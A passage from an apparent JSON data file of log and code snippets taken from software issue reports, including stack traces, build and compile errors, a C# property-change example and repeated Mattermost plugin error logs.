\tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateMemoDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:67\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.TxTimeoutHeightDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:206\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateBasicDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.MempoolFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:54\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.RejectExtensionOptionsDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/ext.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.runAnte\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:81\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:41\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.indexEventsTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/index_events.go:45\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.recoveryTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/recovery.go:74\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.gasTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/gas.go:53\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/baseapp.(*BaseApp).SimDeliver\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/baseapp/test_helpers.go:58\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/bank_test.BenchmarkOneBankSendTxPerBlock\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/bank/bench_test.go:55\r\n[Truncated]\n<!-- git commit hash or release version -->\r\n\r\n## Steps to Reproduce\r\n"
    },
    {
        "logs": "`cs\r\nusing System;\r\nusing System.ComponentModel;\r\nusing System.Runtime.CompilerServices;\r\n\r\nclass C : INotifyPropertyChanged\r\n{\r\n    public event PropertyChangedEventHandler? PropertyChanged;\r\n\r\n    private string? someProperty;\r\n    public string? SomeProperty\r\n    {\r\n        get => this.someProperty;\r\n        set\r\n        {\r\n            if (value == this.someProperty)\r\n            {\r\n                return;\r\n            }\r\n\r\n            // \u26a0 INPC003 Notify that property 'Test' changes.\r\n            this.someProperty = value;\r\n            OnPropertyChanged();\r\n        }\r\n    }\r\n\r\n    public Action Test\r\n    {\r\n        get\r\n        {\r\n            return () => Console.WriteLine(SomeProperty);\r\n        }\r\n    }\r\n\r\n    protected virtual void OnPropertyChanged([CallerMemberName] string? propertyName = null)\r\n    {\r\n        PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));\r\n    }\r\n}\r\n"
    },
    {
        "logs": "`\r\n2016-11-22 16:21:50.874\r\n16:21:50.873 [error] Error in process <0.1664.0> on node 'ct@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35' with exit value:\r\n{{ badmatch,{error,{antidote,\r\n    {bad_return,{{antidote_app,start,[normal,[]]},\r\n        {'EXIT',{{badmatch,{badrpc,{'EXIT',{noproc,{gen_server,call,\r\n            [inter_dc_query,{del_dc,{'dev3@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35',{1479,831551,546284}}},infinity]}}}}}\r\n        ,[\r\n        {inter_dc_manager,'-forget_dc/1-fun-2-',2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,forget_dc,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,reconnect_dcs_after_restart,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,197}]},\r\n        {inter_dc_manager,check_node_restart,0,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,187}]},\r\n        {antidote_app,start,2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/antidote_app.erl\"},{line,60}]},\r\n        {application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,273}]}]}}}}}}},\r\n    [{test_utils,start_node,2,[{file,\"test_utils.erl\"},{line,211}]},{test_utils,'-pmap/2-fun-0-',4,[{file,\"test_utils.erl\"},{line,68}]}]}\r\n"
    },
    {
        "logs": "```\r\n2016-11-22 16:21:50.874\r\n16:21:50.873 [error] Error in process <0.1664.0> on node 'ct@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35' with exit value:\r\n{{ badmatch,{error,{antidote,\r\n    {bad_return,{{antidote_app,start,[normal,[]]},\r\n        {'EXIT',{{badmatch,{badrpc,{'EXIT',{noproc,{gen_server,call,\r\n            [inter_dc_query,{del_dc,{'dev3@testing-gce-9c7052de-389f-4c25-9d20-64660fe2fb35',{1479,831551,546284}}},infinity]}}}}}\r\n        ,[\r\n        {inter_dc_manager,'-forget_dc/1-fun-2-',2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,forget_dc,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,233}]},\r\n        {lists,foreach,2,[{file,\"lists.erl\"},{line,1337}]},\r\n        {inter_dc_manager,reconnect_dcs_after_restart,1,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,197}]},\r\n        {inter_dc_manager,check_node_restart,0,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/inter_dc_manager.erl\"},{line,187}]},\r\n        {antidote_app,start,2,[{file,\"/home/travis/build/SyncFree/antidote/_build/default/lib/antidote/src/antidote_app.erl\"},{line,60}]},\r\n        {application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,273}]}]}}}}}}},\r\n    [{test_utils,start_node,2,[{file,\"test_utils.erl\"},{line,211}]},{test_utils,'-pmap/2-fun-0-',4,[{file,\"test_utils.erl\"},{line,68}]}]}\r\n"
    },
    {
        "logs": "`shell\r\nREADME: document -notify=false\r\n\r\nFixes https://github.com/username_1/drive/issues/791\r\n\r\nDocument that using -notify=false turns off notifying\r\nand that by default -notify is set.\r\n"
    },
    {
        "logs": "```shell\r\nREADME: document -notify=false\r\n\r\nFixes https://github.com/username_1/drive/issues/791\r\n\r\nDocument that using -notify=false turns off notifying\r\nand that by default -notify is set.\r\n"
    },
    {
        "logs": "`c\r\nEntropy = 8.000000 bits per byte (8.0 = random) and could be further compressed by 0.0%\r\nNumber of bits set = (49.9999/50.0001)% (50/50 = random)\r\nBit Ratio = 0.99999485 (Ratio of 1.0 = random)\r\nArithmetic Mean Value = 127.499 (127.5 = random)\r\nMonte Carlo estimate of Pi = 3.13255677 (0.29% error) (3.14159256 = random)\r\nSerial correlation coefficient is 0.000037 (totally uncorrelated = 0.0).\r\n\r\nChi-Squared distribution = 263.282 (lower is more random),\r\nand randomly would exceed this value 34.74 % of the times.\r\n"
    },
    {
        "logs": "`\r\n\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}\r\n\r\n\t// Take until \" |\" as Val1(int)\r\n\tpos = strings.Index(p.Rest, spaceBar)\r\n\tif pos >= 0 {\r\n\t\ttmp = p.Rest[:pos]\r\n\t\tp.Rest = p.Rest[pos+len(spaceBar):]\r\n\t} else {\r\n\t\treturn false, nil\r\n\t}\r\n\tif tmpInt, err = strconv.ParseInt(tmp, 10, 64); err != nil {\r\n\t\treturn false, fmt.Errorf(\"cannot parse "
    },
    {
        "logs": "```\r\n\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}\r\n\r\n\t// Take until \" |\" as Val1(int)\r\n\tpos = strings.Index(p.Rest, spaceBar)\r\n\tif pos >= 0 {\r\n\t\ttmp = p.Rest[:pos]\r\n\t\tp.Rest = p.Rest[pos+len(spaceBar):]\r\n\t} else {\r\n\t\treturn false, nil\r\n\t}\r\n\tif tmpInt, err = strconv.ParseInt(tmp, 10, 64); err != nil {\r\n\t\treturn false, fmt.Errorf(\"cannot parse `%s` into field Val1(int): %s\", tmp, err)\r\n\t}\r\n\tp.Val1 = int(tmpInt)\r\n\r\n\t// Pass all characters ' ' at the rest start\r\n\tfor headPassCounter, headPassValue = range string(p.Rest) {\r\n\t\tif headPassValue != ' ' {\r\n\t\t\tbreak\r\n\t\t}\r\n\t}\r\n\tif headPassCounter > 0 {\r\n\t\tp.Rest = p.Rest[headPassCounter:]\r\n\t}\r\n"
    },
    {
        "logs": "`\r\n======================================================================\r\nERROR: test_bug_808 (pyFAI.test.test_bug_regression.TestBugRegression)\r\nTry to import every single module in the package\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/test/test_bug_regression.py\", line 266, in test_bug_808\r\n    raise err\r\nImportError: cannot import name utils\r\n\r\nStderr:\r\nERROR:pyFAI.test.test_bug_regression:Failed importing pyFAI.opencl.OCLFullSplit from /builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/opencl/OCLFullSplit.py with error: \r\nImportError: cannot import name utils\r\n"
    },
    {
        "logs": "```\r\n======================================================================\r\nERROR: test_bug_808 (pyFAI.test.test_bug_regression.TestBugRegression)\r\nTry to import every single module in the package\r\n----------------------------------------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/test/test_bug_regression.py\", line 266, in test_bug_808\r\n    raise err\r\nImportError: cannot import name utils\r\n\r\nStderr:\r\nERROR:pyFAI.test.test_bug_regression:Failed importing pyFAI.opencl.OCLFullSplit from /builds/silx/bob/pyfai/pyFAI-0.18.0a1/build/debian9/pyFAI-0.18.0a1/.pybuild/pythonX.Y_2.7/build/pyFAI/opencl/OCLFullSplit.py with error: \r\nImportError: cannot import name utils\r\n"
    },
    {
        "logs": "`C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Professional\\MSBuild\\15.0\\Bin\\Microsoft.Common.CurrentVersion.targets(3430,5): error MSB3491: Could not write lines to file \"obj\\Win32\\Release\\All.proj.CoreCompileInputs.cache\". Could not find a part of the path 'D:\\MyRepo\\obj\\Win32\\Release\\All.proj.CoreCompileInputs.cache'"
    },
    {
        "logs": "`\r\n== Compilation error in file lib/ash_json_api/test.ex ==\r\n** (File.Error) could not read file \"test/support/response_schema\": no such file or directory\r\n    (elixir 1.10.2) lib/file.ex:353: File.read!/1\r\n    lib/ash_json_api/test.ex:10: (module)\r\n    (stdlib 3.12) erl_eval.erl:680: :erl_eval.do_apply/6\r\ncould not compile dependency :ash_json_api, \"mix compile\" failed. You can recompile this dependency with \"mix deps.compile ash_json_api\", update it with \"mix deps.update ash_json_api\" or clean it with \"mix deps.clean ash_json_api\"\r\n"
    },
    {
        "logs": "```\r\n== Compilation error in file lib/ash_json_api/test.ex ==\r\n** (File.Error) could not read file \"test/support/response_schema\": no such file or directory\r\n    (elixir 1.10.2) lib/file.ex:353: File.read!/1\r\n    lib/ash_json_api/test.ex:10: (module)\r\n    (stdlib 3.12) erl_eval.erl:680: :erl_eval.do_apply/6\r\ncould not compile dependency :ash_json_api, \"mix compile\" failed. You can recompile this dependency with \"mix deps.compile ash_json_api\", update it with \"mix deps.update ash_json_api\" or clean it with \"mix deps.clean ash_json_api\"\r\n"
    },
    {
        "logs": "`\r\n{\"level\":\"error\",\"ts\":1591898526.1935163,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898526.3017197,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.1210191,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.3408728,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898529.451237,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.1260083,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.293569,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=47ioejhd67b9pnpwep1as3o4me Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898530.2969584,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898530.8210347,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.9364452,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.7847457,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.9855063,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.115114,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.6991549,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.862732,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=8g4dwmod77nkbyynaiyxjo1f1y Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n{\"level\":\"error\",\"ts\":1591898535.4448636,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898535.5482078,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.1768587,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.3703146,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.4109979,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.9740536,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.131942,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=1n46idtz47gpupjxmbrr6g8xte Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898539.135249,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898539.702591,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.8073962,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.547894,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.740053,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898542.7785597,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.3239017,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.475797,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=nbg69tj3gfy6icpyoswosou5pa Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n"
    },
    {
        "logs": "```\r\n{\"level\":\"error\",\"ts\":1591898526.1935163,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898526.3017197,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.1210191,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898528.3408728,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898529.451237,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.1260083,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.293569,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=47ioejhd67b9pnpwep1as3o4me Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898530.2969584,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898530.8210347,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898530.9364452,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.7847457,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898532.9855063,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., 